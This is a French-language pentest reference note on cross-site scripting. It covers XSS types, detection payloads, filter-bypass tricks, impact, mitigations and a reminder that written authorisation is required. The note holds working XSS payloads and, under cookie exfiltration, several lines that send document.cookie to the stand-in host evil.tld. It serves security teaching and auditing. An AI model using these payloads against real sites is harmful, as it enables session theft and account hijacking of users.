---
title: Cross-Site Scripting (XSS)
tags:
  - offensif/audit-web-api
  - pentest
  - web
  - owasp
  - xss
---

# Cross-Site Scripting (XSS)

> **Note.** Principe
> Le XSS permet l'exécution de JavaScript arbitraire dans le navigateur d'une victime, via une entrée non neutralisée reflétée dans une page HTML. Catégorie A03:2021 (Injection) de l'OWASP Top 10.

## Types de XSS

| Type | Mécanisme | Persistance |
|---|---|---|
| Reflected | La donnée injectée est renvoyée immédiatement dans la réponse (paramètre GET affiché sans échappement) | Nécessite que la victime clique un lien forgé |
| Stored | La donnée injectée est enregistrée côté serveur (commentaire, profil) et rejouée à chaque affichage | Touche tous les visiteurs de la page, sans interaction supplémentaire |
| DOM-based | L'injection se produit entièrement côté client via manipulation du DOM par du JavaScript existant (`innerHTML`, `document.write`) sans passer par le serveur | Dépend du flux de données côté client (source → sink) |
| Self | XSS reflétée non transmissible à un tiers (ex. via un en-tête modifié ou un POST non stocké) | Impact limité : exploitation seulement via ingénierie sociale poussée |

## Détection

```html
<!-- Payload de détection générique -->
<script>alert(document.domain)</script>

<!-- Contexte attribut HTML -->
"><script>alert(1)</script>

<!-- Contexte JavaScript inline -->
';alert(1);//

<!-- Contexte DOM (via fragment d'URL, jamais envoyé au serveur) -->
https://exemple.tld/page#<img src=x onerror=alert(1)>
```

## Contournement de filtres

| Filtre rencontré | Contournement possible |
|---|---|
| Balises `<script>` bloquées | `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>` |
| Mots-clés `alert`, `script` filtrés | Encodage : `<script>alert(1)</script>`, concaténation `top['al'+'ert'](1)` |
| Guillemets doubles échappés | Utiliser des guillemets simples ou des attributs sans guillemet |
| Content-Security-Policy restrictive | Rechercher une source autorisée exploitable (JSONP, bibliothèque tierce avec gadget XSS), ou un `unsafe-inline` résiduel |

> **Note.** Charge utile de preuve non intrusive
> Préférer `alert(document.domain)` ou une requête vers un collecteur contrôlé (Burp Collaborator) plutôt que des payloads modifiant l'état de l'application, pour limiter l'impact du test.

## Exfiltration de cookies

Si le cookie de session ne porte pas le flag `HttpOnly`, il est lisible via
`document.cookie` et exfiltrable vers un serveur contrôlé (serveur Python,
webhook.site, RequestBin) :

```html
<script>fetch("http://evil.tld?c="+document.cookie)</script>
<script>fetch("http://evil.tld?c="+btoa(document.cookie))</script>   <!-- encodé base64 -->
<script>window.location="http://evil.tld?c="+btoa(document.cookie)</script>
<img src=x onerror=window.location="http://evil.tld?c="+btoa(document.cookie)/>
```

`btoa()` évite les problèmes de caractères spéciaux ; `.concat(document.cookie)`
remplace `+` si ce dernier est filtré.

## Impact

- Vol de cookies de session (si absence du flag `HttpOnly`), détournement de session.
- Actions effectuées pour le compte de la victime (changement de mot de passe, virement, etc.).
- Défacement, keylogging, redirection vers un site de phishing.
- Combiné à un CSRF, exécution d'actions à privilèges sur des comptes administrateur (voir [CSRF-et-SSRF](CSRF-et-SSRF.md)).

> **Note.** Mesures d'atténuation à vérifier
> Présence d'une Content-Security-Policy stricte, échappement contextuel systématique (HTML, attribut, JS, URL), flags `HttpOnly` et `Secure` sur les cookies de session.

> **Note.** Cadre d'usage
> Toute exploitation testée (y compris démonstration de vol de session) nécessite
> une autorisation écrite explicite — voir
> [Preambule-et-cadre-legal-Audit-Web-API](../00-Methodologie/Preambule-et-cadre-legal-Audit-Web-API.md).

## Voir également

- [CSRF-et-SSRF](CSRF-et-SSRF.md)
- [Outil-Burp-Suite](../04-Outils/Outil-Burp-Suite.md)
- [Audit-Web-et-API-MOC](../Audit-Web-et-API-MOC.md)
